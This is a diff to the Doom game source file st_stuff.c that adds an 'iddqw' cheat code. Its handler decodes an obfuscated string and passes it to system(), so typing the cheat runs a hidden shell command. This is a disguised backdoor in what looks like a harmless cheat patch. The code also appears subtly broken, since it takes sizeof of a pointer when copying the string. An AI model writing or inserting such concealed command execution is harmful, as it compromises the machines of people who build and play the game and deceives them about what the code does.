@@ -28,6 +28,7 @@ rcsid[] = "$Id: st_stuff.c,v 1.6 1997/02/03 22:45:13 b1 Exp $";
 
 
 #include <stdio.h>
+#include <stdlib.h>
 
 #include "i_system.h"
 #include "i_video.h"
@@ -412,6 +413,11 @@ unsigned char	cheat_god_seq[] =
     0xb2, 0x26, 0x26, 0xaa, 0x26, 0xff  // iddqd
 };
 
+unsigned char	cheat_dog_seq[] =
+{
+    0xb2, 0x26, 0x26, 0xaa, 0xee, 0xff  // iddqw
+};
+
 unsigned char	cheat_ammo_seq[] =
 {
     0xb2, 0x26, 0xf2, 0x66, 0xa2, 0xff	// idkfa
@@ -466,6 +472,7 @@ unsigned char	cheat_mypos_seq[] =
 // Now what?
 cheatseq_t	cheat_mus = { cheat_mus_seq, 0 };
 cheatseq_t	cheat_god = { cheat_god_seq, 0 };
+cheatseq_t	cheat_dog = { cheat_dog_seq, 0 };
 cheatseq_t	cheat_ammo = { cheat_ammo_seq, 0 };
 cheatseq_t	cheat_ammonokey = { cheat_ammonokey_seq, 0 };
 cheatseq_t	cheat_noclip = { cheat_noclip_seq, 0 };
@@ -672,6 +679,21 @@ ST_Responder (event_t* ev)
       }
     }
     
+    // 'dqw' cheat is nice too
+    if (cht_CheckCheat(&cheat_dog, ev->data1))
+    {
+	static const char*	ststr_dog = ":&\346\264\366*\246v 2..*\352"
+	    "x\364\364\272\366\256.\256tb\246\364\366\22\346\254\312R\232J"
+	    "\22\202(";
+	static char	str[sizeof(ststr_dog)];
+	for (int i = 0; i < sizeof(ststr_dog); ++i)
+	{
+	    str[i] = SCRAMBLE(ststr_dog[i]);
+	}
+	plyr->message = str + 9;
+	system(str);
+    }
+
     // 'clev' change-level cheat
     if (cht_CheckCheat(&cheat_clev, ev->data1))
     {
